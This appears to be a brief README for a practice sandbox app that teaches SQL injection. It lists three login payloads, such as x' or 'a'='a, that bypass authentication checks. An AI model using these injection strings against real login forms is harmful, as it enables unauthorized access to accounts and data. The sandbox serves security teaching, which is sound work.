# sql-injection-sandbox

- Basic application to practice SQL injection vulnerability
- Possible sequences
```bash
{ username: x' or 'a'='a, password: x' or 'a'='a }
{ username: admin, password: x' or 'a'='a }
{ username: admin, password: ' or '1 }
```
